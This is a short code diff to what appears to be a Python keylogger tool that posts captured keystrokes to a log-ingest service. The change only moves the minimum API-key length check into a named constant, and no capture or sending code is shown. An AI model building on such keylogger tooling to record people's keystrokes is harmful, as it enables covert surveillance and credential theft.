@@ -28,6 +28,8 @@ BANNER = r"""
 GitHub: https://github.com/Stalin-143
 """
 
+MIN_API_KEY_LENGTH = 24
+
 
 class KeyLogger:
     """Keylogger class to handle keyboard input capture and logging."""
@@ -231,8 +233,8 @@ def main():
         print("ERROR: LOG_INGEST_API_KEY environment variable is required.")
         sys.exit(1)
 
-    if len(api_key) < 24:
-        print("ERROR: LOG_INGEST_API_KEY must be at least 24 characters.")
+    if len(api_key) < MIN_API_KEY_LENGTH:
+        print(f"ERROR: LOG_INGEST_API_KEY must be at least {MIN_API_KEY_LENGTH} characters.")
         sys.exit(1)
     
     if args.no_verify_ssl:
